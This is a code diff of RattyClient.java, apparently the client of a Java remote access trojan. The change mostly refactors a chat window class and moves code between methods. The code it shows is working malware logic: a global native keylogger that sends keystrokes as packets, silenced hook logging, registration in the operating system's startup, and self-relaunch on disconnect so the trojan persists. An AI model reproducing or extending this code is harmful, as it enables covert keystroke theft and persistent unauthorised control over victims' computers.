@@ -4,6 +4,7 @@
 
 package de.sogomn.rat;
 
+import java.io.File;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
@@ -14,8 +15,8 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
 import de.sogomn.engine.util.FileUtils;
-import de.sogomn.rat.gui.ChatWindow;
 import de.sogomn.rat.gui.IGuiController;
+import de.sogomn.rat.gui.swing.ChatSwingGui;
 import de.sogomn.rat.packet.ChatPacket;
 import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.KeylogPacket;
@@ -27,7 +28,7 @@ public final class RattyClient implements IConnectionObserver, IGuiController {
 	
 	private ActiveConnection connection;
 	
-	private ChatWindow chat;
+	private ChatSwingGui chat;
 	private NativeKeyListener keylogger;
 	
 	private static final int VOICE_BUFFER_SIZE = 1024 << 8;
@@ -36,7 +37,7 @@ public final class RattyClient implements IConnectionObserver, IGuiController {
 	public RattyClient(final ActiveConnection connection) {
 		this.connection = connection;
 		
-		chat = new ChatWindow();
+		chat = new ChatSwingGui();
 		keylogger = new NativeKeyListener() {
 			@Override
 			public void nativeKeyPressed(final NativeKeyEvent n) {
@@ -82,7 +83,7 @@ public final class RattyClient implements IConnectionObserver, IGuiController {
 			chat.setVisible(true);
 		}
 		
-		chat.addLine(message);
+		chat.appendLine(message);
 	}
 	
 	@Override
@@ -102,7 +103,9 @@ public final class RattyClient implements IConnectionObserver, IGuiController {
 	
 	@Override
 	public void disconnected(final ActiveConnection connection) {
-		FileUtils.executeFile(Constants.JAR_FILE);
+		final File jarFile = Constants.JAR_FILE.toFile();
+		
+		FileUtils.executeFile(jarFile);
 		
 		/*Better have 2 same clients than not a single one, right?*/
 		
@@ -116,8 +119,8 @@ public final class RattyClient implements IConnectionObserver, IGuiController {
 	
 	@Override
 	public void userInput(final String command, final Object source) {
-		if (command == ChatWindow.MESSAGE_SENT) {
-			final String message = chat.getMessage();
+		if (command == ChatSwingGui.MESSAGE_SENT) {
+			final String message = chat.getMessageInput();
 			final ChatPacket packet = new ChatPacket(message);
 			
 			connection.addPacket(packet);
@@ -130,9 +133,23 @@ public final class RattyClient implements IConnectionObserver, IGuiController {
 	 * ==================================================
 	 */
 	
-	private static void addToStartup() {
+	public static void registerNativeHook() {
+		final Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
+		
+		logger.setLevel(Level.OFF);
+		logger.setUseParentHandlers(false);
+		
+		final Thread hook = new Thread(() -> {
+			try {
+				GlobalScreen.unregisterNativeHook();
+			} catch (final Exception ex) {
+				ex.printStackTrace();
+			}
+		});
+		
 		try {
-			Constants.OS_SERVICE.addToStartup(Constants.JAR_FILE);
+			GlobalScreen.registerNativeHook();
+			Runtime.getRuntime().addShutdownHook(hook);
 		} catch (final Exception ex) {
 			ex.printStackTrace();
 		}
@@ -191,29 +208,10 @@ public final class RattyClient implements IConnectionObserver, IGuiController {
 	}
 	
 	public static void main(final String[] args) {
-		final Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
-		
-		logger.setLevel(Level.OFF);
-		logger.setUseParentHandlers(false);
-		
-		final Thread hook = new Thread(() -> {
-			try {
-				GlobalScreen.unregisterNativeHook();
-			} catch (final Exception ex) {
-				ex.printStackTrace();
-			}
-		});
-		
-		addToStartup();
+		Constants.OS_SERVICE.addToStartup(Constants.JAR_FILE);
 		Constants.setSystemLookAndFeel();
 		
-		try {
-			GlobalScreen.registerNativeHook();
-			Runtime.getRuntime().addShutdownHook(hook);
-		} catch (final Exception ex) {
-			ex.printStackTrace();
-		}
-		
+		registerNativeHook();
 		startClient();
 	}
 	
